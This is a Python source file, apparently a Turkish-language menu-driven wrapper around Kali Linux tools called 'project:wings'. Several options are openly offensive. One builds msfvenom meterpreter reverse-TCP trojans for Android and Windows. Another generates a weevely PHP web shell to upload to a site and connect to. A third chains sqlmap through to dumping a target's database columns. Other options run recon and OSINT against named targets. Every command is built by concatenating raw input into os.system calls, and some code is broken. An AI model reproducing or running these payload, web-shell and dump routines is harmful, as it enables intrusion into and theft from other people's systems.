#!/usr/bin/env python

# -*- coding: utf-8 -*-


##################################################
#                 project:wings                 #
#                Automatized Kali               #
#                  Linux Tools                  #
#              github.com/oxydes-cyber          #
#        !!!DONT COPY WITHOUT PERMISSIONS!!!    #
#                 Author: oxydes                #
#          contact: instagram.com/oxydes7       #
#           https://allmylinks.com/oxydes       #
#              DEVELOPMENT IN PROGRESS          #
##################################################
import os

import colorama

import time

import onetimepad

import psutil

from tabulate import tabulate

import speedtest

from tkinter import *

from pytube import YouTube

import sys

import phonenumbers

import wikipedia

import requests

import folium

import webbrowser

import tkinter as tk

from tkinter import filedialog

from PIL import Image

import selenium

import json

import instagram_explore as ie

import bs4


from phonenumbers import geocoder, carrier

try:

    def banner():
        print(
            """
                ##################################################
                #                 project:wings                 #
                #                Automatized Kali               #
                #                  Linux Tools                  #
                #              github.com/oxydes-cyber          #
                #        !!!DONT COPY WITHOUT PERMISSIONS!!!    #
                #                 Author: oxydes                #
                #          contact: instagram.com/oxydes7       #
                #           https://allmylinks.com/oxydes       #
                #              DEVELOPMENT IN PROGRESS          #
                ##################################################
                """
        )

    def banner_two():
        from colorama import Fore, Style

        os.system("clear")
        print(
            Fore.RED
            + """
                                                       /$$
                                                      |__/
                                         /$$  /$$  /$$ /$$ /$$$$$$$   /$$$$$$   /$$$$$$$
                                        | $$ | $$ | $$| $$| $$__  $$ /$$__  $$ /$$_____/
                                        | $$ | $$ | $$| $$| $$  \ $$| $$  \ $$|  $$$$$$
                                        | $$ | $$ | $$| $$| $$  | $$| $$  | $$ \____  $$
                                        |  $$$$$/$$$$/| $$| $$  | $$|  $$$$$$$ /$$$$$$$/
                                         \_____/\___/ |__/|__/  |__/ \____  $$|_______/
                                                                     /$$  \ $$
                                                                    |  $$$$$$/
                                                                     \______/
                                O7      O7      O7      O7      O7      O7      O7      O7      O7      O7
                                O7      O7      O7      O7      O7      O7      O7      O7      O7      O7
                                O7      O7      O7      O7      O7      O7      O7      O7      O7      O7
                """
        )
        print(Fore.BLUE)

    banner_two()
    time.sleep(5)
    os.system("clear")
    banner()

    def netdiscover():
        os.system("clear")
        os.system("figlet NETDISCOVER")
        print("Netdiscovera Hoşgeldiniz :)")
        time.sleep(7)
        os.system("netdiscover")

    def nikto():
        os.system("clear")
        os.system("figlet Nikto Scanner")
        print("Nikto Web Açık Tarayıcısına Hoşgeldiniz:)")
        time.sleep(3)
        ip = input("Hedef Ip Adresini Veya Host Adresini Gir : ")
        os.system("nikto -h " + ip + " -e 3")

    def trojan():

        os.system("clear")
        os.system("figlet MSFVENOM")
        print("Trojan Oluşturucuya Hoşgeldiniz:)")
        print(
            """
                Payloadlar ;
                1)Telefonlar İçin
                2)Windows İçin
                """
        )

        secim = int(input("Seçiminizi Yapın : "))
        lhost = input("IP Adresinizi Girin : ")
        lport = input("Portu Girin (443) : ")
        if secim == 1:
            os.system(
                "msfvenom -p android/meterpreter/reverse_tcp LHOST="
                + lhost
                + " LPORT="
                + lport
                + " -f raw -e generic/none -i 1 -o /root/Masaüstü/trojen.apk"
            )
            print("Trojan /root/Masaüstü/trojen.apk Yoluna Oluşturuldu.")

        if secim == 2:
            os.system(
                "msfvenom -p windows/meterpreter/reverse_tcp LHOST="
                + lhost
                + " LPORT="
                + lport
                + " -f exe -e generic/none -i 1 -o /root/Masaüstü/trojen.exe"
            )
            print("Trojan /root/Masaüstü/trojen.exe Yoluna Oluşturuldu.")

    def rootkit():
        os.system("clear")
        os.system("figlet ROOTKIT SCANNER")
        soru = input("Rootkit Taraması Yapmak İster Misiniz ? (e/h) : ")
        if soru == "e":
            os.system("chkrootkit")
        elif soru == "h":
            print("Pekala :)")

    def weevely():
        os.system("clear")

        os.system("figlet WEB SHELL")

        while True:

            soru = input("Shell Dosyası Üretilsin Mi? (e/h) (çıkmak için q) : ")

            if soru == "e":
                sifre = input("Dosyaya Erişmek İçin Bir Şifre Girin : ")
                print("Dosya Üretiliyor...")
                time.sleep(2)
                os.system(
                    "weevely generate " + sifre + " /root/Masaüstü/php_dosyasi.php"
                )
                print("Dosya /root/Masaüstü/php_dosyasi.php Yoluna Oluşturuldu...")
                secim = input(
                    "Dosya Dinlemeye Alınsın Mı (lütfen dosyayı siteye yükledikten sonra burayı cevaplayın(e/h çıkmak için q)) : "
                )
                if secim == "e":
                    url = input("Dosyayı Yüklediğiniz Adresi Girin : ")
                    print("3 Saniye Sonra Bağlantı Kurulmaya Çalışılacak...")
                    time.sleep(3)
                    os.system("weevely " + url + " " + sifre)
                elif secim == "h":
                    print("Uygulamadan Çıkılıyor...")
                    False
                elif secim == "q":
                    sys.exit()
            elif soru == "h":
                print("Uygulamadan Çıkılıyor...")
                False
            elif soru == "q":
                sys.exit()

    def skipfish():

        os.system("clear")

        os.system("figlet SKIPFISH")

        print("LÜTFEN URLYI https://site.com/ OLARAK GİRİN")

        print("Skipfish Sistemlerde Açık Tarayan İleri Düzey Bir Uygulamadır.")

        while True:
            secim = input("Devam Etmek İstiyor Musunuz? (e/h çıkmak için q) : ")
            if secim == "e":
                url = input("Hedef Site Url Adresi Girin : ")
                print("3 Saniye Sonra Tarama Başlatılacak...")
                time.sleep(3)
                os.system("skipfish -o /root/Masaüstü/sonuclar " + url)
                print("Sonuçlar /root/Masaüstü/sonuclar/index.html Yoluna Kaydedildi")

            elif secim == "h":
                print("Pekala:)")
                False
            elif secim == "q":
                print("Görüşmek Üzere :)")
                sys.exit()
            else:
                print("Beklenmeyen Hata:(")

    def nmap():
        os.system("clear")
        os.system("figlet NMAP")
        print("Port Scannera Hoşgeldiniz Nmap Kullanılarak Yapılmıştır...")
        while True:
            soru = input("Devam Etmek İster Misiniz? (e/h) : ")
            if soru == "e":

                print(
                    """
                                1)Hızlı Tarama
                                2)Firewall Taraması
                                3)İşletim Sistemi Taraması
                                4)SYN Taraması
                                5)Versiyon Taraması
                                6)SYN + Versiyon
                                7)Hepsi Bir Arada Tarama
                                """
                )
                secim = int(input("Seçiminizi Girin : "))
                ip = input("Hedef Host Veya Ip Adresi : ")
                if secim == 1:
                    os.system("nmap " + ip)
                elif secim == 2:
                    os.system("nmap -sA --script=http-waf-detect " + ip)
                elif secim == 3:
                    os.system("nmap -O " + ip)
                elif secim == 4:
                    os.system("nmap -sS " + ip)
                elif secim == 5:
                    os.system("nmap -sV " + ip)
                elif secim == 6:
                    os.system("nmap -sS -sV " + ip)
                elif secim == 7:
                    os.system("nmap -A -O -sS -sV -sC" + ip)

                else:
                    print("Hatalı Giriş")

            elif soru == "h":
                print("Görüşürüz :)")
                sys.exit()

    def sqlmap():

        os.system("figlet SQLMAP")

        print("Uygulama 3 Saniye Sonra Başlatılacak...")
        time.sleep(3)
        while True:
            soru = input(
                "SQLMAP Başlatıldı Devam Etmek İstiyor Musunuz? (e/h çıkmak için q) : "
            )
            if soru == "e":
                url = input("Açıklı Url'yi Girin : ")
                os.system("sqlmap -u " + url + " --dbs")
                sual = input(
                    "Databaseler Göründüyse e Tuşlayın(gözükmediyse açık yoktur...)"
                )
                if sual == "e":
                    database = input("Database Adını Girin : ")
                    os.system("sqlmap -u " + url + " -D " + database + " --tables")
                    tables = input("Table Adını Girin : ")
                    os.system(
                        "sqlmap -u "
                        + url
                        + " -D "
                        + database
                        + " -T "
                        + tables
                        + " --columns"
                    )
                    column = input("Column Adı Girin : ")
                    os.system(
                        "sqlmap -u "
                        + url
                        + " -D "
                        + database
                        + " -T "
                        + tables
                        + " -C "
                        + column
                        + " --dump"
                    )
                    print("İşlem Bitti Hoşçakal...")
                    sys.exit()
            elif soru == "h":
                print("Peki:)")
                False
            elif soru == "q":
                print("Görüşürüz...")
                sys.exit()

    def osint_by_phone():
        from phonenumbers import geocoder, carrier

        os.system("clear")
        os.system("figlet OSINT BY PHONE")
        print("Lütfen Telefon Numarasını +905********* gibi giriniz.")
        print("Telefon Numarasından Ülke ve GSM Şirketi Bul")
        while True:
            secimin = input("Devam Etmek İçin e Çıkmak İçin h Girin : ")
            if secimin == "e":
                phone_number = input("Telefon Numarası Giriniz : ")
                isleme_girecek = phonenumbers.parse(phone_number)
                print(geocoder.description_for_number(isleme_girecek, "en"))
                print(carrier.name_for_number(isleme_girecek, "en"))
            elif secimin == "h":
                print("Peki ;)")
                False
                break

    def dnsmap():
        os.system("clear")
        os.system("figlet dnsmap")
        print("dnsmap'e hoşgeldin.Hedef siteyi gir.Subdomainleri söylesin.")
        while True:
            secim = input("dnsmap'i seçtiniz.Devam etmek istiyor musunuz? e/h : ")
            if secim == "e":
                web = input("hedef siteyi gir : ")
                os.system("dnsmap " + web)
            elif secim == "h":
                print("yönlendiriliyorsunuz...")
                False
                break

    def dirb():
        os.system("clear")
        os.system("figlet DIRB")
        print(
            "Dirb'e hoşgeldin.Hedef siteyi gir,Hedef sitedeki içeriklerin linklerine ulaş."
        )
        while True:
            secim = input(
                "Dirb seçeneğini seçtiniz.Devam etmek istiyor musunuz? e/h : "
            )
            if secim == "e":
                print(
                    "ÖNEMLİ!!! : Web sitesini http://domain.com veya https://domain.com olarak girin,aksi takdirde çalışmayacaktır."
                )
                site = input("Web sitesini giriniz : ")
                os.system("dirb " + site + " /usr/share/dirb/wordlists/big.txt")
            elif secim == "h":
                print("Görüşmek Üzere :)")
                False
                break

    def theHarvester():
        os.system("clear")
        os.system("figlet theHarvester")
        print(
            "theHarvester'a hoşgeldin.Hedef siteyi gir theHarvester sana aktif,pasif bilgi toplasın."
        )
        while True:
            secim = input(
                "theHarvester'ı seçtin.Devam etmek için e Çıkmak için h tuşuna bas : "
            )
            if secim == "e":
                domain = input("Hedef siteyi gir : ")
                sonuclar = input(
                    "Sonuçları kaydetmek için alan girin.(örneğin : /root/Masaüstü/sonuclar) : "
                )
                os.system(
                    "theHarvester -d "
                    + domain
                    + " -b all -l 400 -v -s -n -f "
                    + sonuclar
                )
                print("Sonuçlar " + sonuclar + " klasörüne kaydedildi.")
            elif secim == "h":
                print("Hoşçakal:')")
                False
                break

    def dig():
        os.system("clear")
        os.system("figlet DIG")
        print("DIG'e hoşgeldin.Hedef sitenin domain kayıtlarını gösterir.")
        while True:
            ques = input(
                "dig seçeneğini seçtin.Devam etmek istediğinden emin misin? e/h : "
            )
            if ques == "e":
                domain = input("Hedef siteyi gir : ")
                print("Sonuçlar yükleniyor...")
                time.sleep(3)
                os.system("dig +trace " + domain)
            elif ques == "h":
                False
                break

    def whois():
        os.system("clear")
        os.system("figlet WHOIS")
        while True:
            ques = input("whois'e hoşgeldin.devam etmek ister misin? e/h : ")
            if ques == "e":
                domain = input("domain gir : ")
                print("sonuçlar yükleniyor...")
                time.sleep(3)
                os.system("whois " + domain)
            elif ques == "h":
                False
                break

    def firewall_detect():
        os.system("clear")
        os.system("figlet wafw00f")
        while True:
            ques = input(
                "Merhaba 'Web Aplikasyonu Güvenlik Duvarı Tarayıcısı :)''nı seçtin devam etmek istiyor musun? e/h : "
            )
            if ques == "e":
                www = input("Hedef Domain'i gir : ")
                time.sleep(2)
                os.system("wafw00f " + www)
            elif ques == "h":
                False
                break

    def wiki():
        os.system("clear")
        os.system("figlet WIKIPEDIA")
        print("Bu uygulama terminal üzerinden wikipedia araması yapmaznızı sağlar.")

        while True:
            ques = input("\nDevam etmek istiyor musun? e/h : ")
            if ques == "e":
                search = input("Neyi aramak istersiniz? : ")
                result = wikipedia.summary(search)
                print(result)
            elif ques == "h":
                False
                break
            else:
                print("Bir hatayla Karşılaşıldı...")
                sys.exit()

    def insta_explore():
        os.system("clear")
        os.system("figlet IG_EXPLORE")

        while True:
            print("Bu uygulama Instagram profillerinin verilerini çeker")
            ques = input(
                "\n'InstaExplore' seçtiniz,devam etmek istiyor musunuz? e/h : "
            )

            if ques == "e":
                # kullanıcıyı bul
                name = input("Hedefin kullanıcı adını girin : ")
                result = ie.user(name)

                parsed_data = json.dumps(result, indent=4, sort_keys=True)

                # bilgileri göster
                print(parsed_data[15:400])

            elif ques == "h":
                secim = input("Emin Misiniz? e/h : ")

                if secim == "e":
                    False
                    break
                elif secim == "h":
                    True
            else:
                print("Bir Hatayla Karşılaşıldı...")
                False
                break
                sys.exit()

    def url_scraper():
        from bs4 import BeautifulSoup

        os.system("clear")
        os.system("figlet SITE_SCRAPER")
        print(
            "\nLütfen siteyi http veya https belirterek girin.örn : https://google.com"
        )

        # boş liste oluştur
        urls = []

        # fonksiyon oluştur
        def scrape(site):
            # url'den request'i al
            r = requests.get(site)
            # text'i dönüştür
            s = BeautifulSoup(r.text, "html.parser")

            for i in s.find_all("a"):
                href = i.attrs["href"]
                if href.startswith("/"):
                    site = site + href
                    if site not in urls:
                        urls.append(site)
                        print(site)
                        # scrape fonksiyonunu çağırma(itself)/recursion
                        scrape(site)

        # ana fonksiyon

        if __name__ == "__main__":
            # scrapelenecek site
            site = input("Web Sitesini Gir : ")
            # fonksiyonu çağır
            scrape(site)

    def ip_information():
        os.system("clear")
        os.system("figlet IP_INFO")
        print("@alismsk234'den esinlenilmiştir,teşekkürler.\n")

        ipA = input("Hedef ip adresini gir>> ")
        adres = "https://tools.keycdn.com/geo.json?host=" + ipA
        baglan = requests.post(adres)
        baGlann = baglan.json()
        print("İp adresi: " + baGlann["data"]["geo"]["ip"])
        print("Konumu: " + baGlann["data"]["geo"]["timezone"])
        print("Posta Kodu: " + baGlann["data"]["geo"]["postal_code"])

        a = baGlann["data"]["geo"]["latitude"]
        b = baGlann["data"]["geo"]["longitude"]
        print("Koordinat: ", a, ",", b)
        c = baGlann["data"]["geo"]["city"]
        d = baGlann["data"]["geo"]["region_code"]
        print("Şehir ve şehir kodu: ", c, d)

        ques = input("Koordinatlarına haritadan bakılsın mı? e/h >> ")

        if ques == "e" or "E":
            map = folium.Map(location=[str(a), str(b)])
            map.save("map1.html")
            print(
                "Harita 'project-wings' dizinin altındaki wings klasörünün altına 'map1.html' olarak kaydedildi."
            )

        elif ques == "h" or "H":
            print("Görüşmek üzere")
        else:
            print("Hata...")
            sys.exit()

    def video_downloader():
        os.system("clear")
        os.system("figlet YT Downloader")
        print("Bu uygulama YouTube videolarını yükler...")
        time.sleep(2)
        while True:
            ques = input(
                "YouTube video indiriciyi seçtiniz...Devam etmek istiyor musunuz ? e/h : "
            )
            if ques == "e":
                link = input("indirmek istediğin videonun linkini gir : ")
                print("\nindiriliyor\n")
                time.sleep(1)
                YouTube(link).streams.first().download()
                print("video wings.py dosyasını çalıştırdığınız klasöre indirildi...")
            elif ques == "h":
                print("Görüşürüz :)")
                False
                break
            else:
                print("Beklenmedik Hata")

    def crypto():

        root = Tk()
        root.title("CRYPTOGRAPHY")
        root.geometry("430x100")

        def encryptMessage():
            pt = e1.get()
            ct = onetimepad.encrypt(pt, "random")
            e2.insert(0, ct)

        def decryptMessage():
            ct1 = e3.get()
            pt1 = onetimepad.decrypt(ct1, "random")
            e4.insert(0, pt1)

        label1 = Label(root, text="plaintext")
        label1.grid(row=10, column=1)
        label2 = Label(root, text="encrypted text")
        label2.grid(row=11, column=1)
        l3 = Label(root, text="cypher text")
        l3.grid(row=10, column=10)
        l4 = Label(root, text="decrypted text")
        l4.grid(row=11, column=10)

        e1 = Entry(root)
        e1.grid(row=10, column=2)
        e2 = Entry(root)
        e2.grid(row=11, column=2)
        e3 = Entry(root)
        e3.grid(row=10, column=11)
        e4 = Entry(root)
        e4.grid(row=11, column=11)

        ent = Button(root, text="encrypt", bg="red", fg="white", command=encryptMessage)
        ent.grid(row=13, column=2)

        b2 = Button(
            root, text="encrypt", bg="green", fg="white", command=decryptMessage
        )
        b2.grid(row=13, column=11)

        root.mainloop()

    def speed_test():
        def internet_speed():
            class Network_Details(object):
                def __init__(self):
                    self.parser = psutil.net_if_addrs()
                    self.speed_parser = speedtest.Speedtest()
                    self.interfaces = self.interface()[0]

                def interface(self):
                    interfaces = []
                    for interface_name, _ in self.parser.items():
                        interfaces.append(str(interface_name))
                        return interfaces

                def __repr__(self):
                    down = str(
                        f"{round(self.speed_parser.download() / 1_000_000, 2)} Mbps"
                    )
                    up = str(f"{round(self.speed_parser.upload() / 1_000_000, 2)} Mbps")
                    interface = self.interfaces
                    data = {
                        "Interface : ": [interface],
                        "Download : ": [down],
                        "Upload : ": [up],
                    }
                    table = tabulate(data, headers="keys", tablefmt="pretty")
                    return table

            if __name__ == "__main__":
                print(Network_Details())

        internet_speed()

    def png_to_jpg():
        root = tk.Tk()

        canvas1 = tk.Canvas(root, width=300, height=250, bg="azure3", relief="raised")
        canvas1.pack()

        label1 = tk.Label(root, text="File Conversion Tool", bg="azure3")
        label1.config(font=("helvetica", 20))
        canvas1.create_window(150, 60, window=label1)

        def getPNG():
            global im1

            import_file_path = filedialog.askopenfilename()
            im1 = Image.open(import_file_path)

        browseButton_PNG = tk.Button(
            text="PNG dosyayı gir",
            command=getPNG,
            bg="royalblue",
            fg="white",
            font=("helvetica", 12, "bold"),
        )
        canvas1.create_window(150, 130, window=browseButton_PNG)

        def convertToJPG():
            global im1
            export_file_path = filedialog.asksaveasfilename(defaultextension=".jpg")
            im1.save(export_file_path)

        saveAsButton_JPG = tk.Button(
            text="PNG dosyasını JPG dosyasına çevir",
            command=convertToJPG,
            bg="royalblue",
            fg="white",
            font=("helvetica", 12, "bold"),
        )
        canvas1.create_window(150, 180, window=saveAsButton_JPG)

        root.mainloop()
    def domain_check():
        os.system("clear")
        os.system("figlet Domain Check")
    	print("\nDomain'in satın alınıp alınmadığını gösterir.\n")
    	try:
    		www = input("Domain'i girin >> ")
    		domain = whois.whois(str(www))
    		if domain.domain_name == None:
    			sys.exit(1)
    	except:
    		print("Bu domain satın alınmamış :)")
    	else:
    		print("Domaini almışlar be :((")
    def star_wars():
        os.system("clear")
        print("Canın mı sıkıldı :(")
        time.sleep(2)
        print("o zaman eğlence molası :)")
        time.sleep(2)
        ques = input("Terminalde Star Wars izlemek ister misin? e / h : ")
        if ques == "e":
            os.system("telnet towel.blinkenlights.nl")
        elif ques == "h":
            print("görüşürüz")
            sys.exit()
        else:
            print("Hatalı seçim")

    print(
        """
        1)netdiscover
        2)nikto
        3)msfvenom(%100 fud değil)
        4)rootkit scanner
        5)weevely web shell
        6)skipfish
        7)nmap
        8)sqlmap
        9)telefon osint
        10)dnsmap
        11)dirb
        12)theHarvester
        13)wafw00f
        14)dig
        15)wiki-search
        16)insta_explore
        17)url_scraper
        18)IP_INFORMATION
        19)youtube video indirici
        20)Cryptography
        21)Speed_Test
        22)png'yi jpg'ye dönüştür
        23)domain check
        24)Canın mı Sıkıldı?Buraya gir:)
        99)çıkış
        """
    )
    secim = int(input("Seçiminizi Girin : "))

    if secim == 1:
        netdiscover()

    elif secim == 2:
        nikto()

    elif secim == 3:
        trojan()

    elif secim == 4:
        rootkit()

    elif secim == 5:
        weevely()

    elif secim == 6:
        skipfish()

    elif secim == 7:
        nmap()

    elif secim == 8:
        sqlmap()

    elif secim == 9:
        osint_by_phone()

    elif secim == 10:
        dnsmap()

    elif secim == 11:
        dirb()

    elif secim == 12:
        theHarvester()

    elif secim == 13:
        firewall_detect()

    elif secim == 14:
        dig()

    elif secim == 15:
        wiki()

    elif secim == 16:
        insta_explore()

    elif secim == 17:
        url_scraper()

    elif secim == 18:
        ip_information()

    elif secim == 19:
        video_downloader()

    elif secim == 20:
        crypto()

    elif secim == 21:
        speed_test()

    elif secim == 22:
        png_to_jpg()
    elif secim == 23:
        domain_check()

    elif secim == 24:
        star_wars()

    elif secim == 99:
        print("Görüşmek Üzere")
        sys.exit()

    else:
        print("Hatalı Giriş Yaptınız ...")

except KeyboardInterrupt:
    os.system("clear")
    print("\nHoşçakal:)")
